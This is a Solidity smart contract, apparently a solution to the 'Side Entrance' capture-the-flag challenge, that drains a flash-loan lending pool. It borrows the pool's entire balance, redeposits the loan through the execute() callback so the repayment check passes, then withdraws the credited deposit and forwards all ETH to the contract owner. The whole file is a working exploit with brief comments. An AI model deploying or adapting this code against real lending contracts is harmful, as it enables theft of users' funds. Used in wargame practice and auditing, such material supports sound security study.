// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract SideEntranceExploiter is Ownable {

    using Address for address;
    using Address for address payable;

    constructor() Ownable() {
    }

    function runExploit(address _lenderAddress) external {
        _lenderAddress.functionCall(abi.encodeWithSignature(
                                        "flashLoan(uint256)",
                                        address(_lenderAddress).balance
                                    )); // requesting entire balance in flashloan
        _lenderAddress.functionCall(abi.encodeWithSignature("withdraw()"));
        withdraw();
    }

    // @dev this will be called when the lenderPool sends ETH to this contract
    function execute() external payable {
        msg.sender.functionCallWithValue(abi.encodeWithSignature(
                                            "deposit()"),
                                            address(this).balance
                                        );
    }

    // @dev send money to contract owner
    function withdraw() public {
        payable(owner()).sendValue(address(this).balance);
    }

    receive() external payable {
    }
}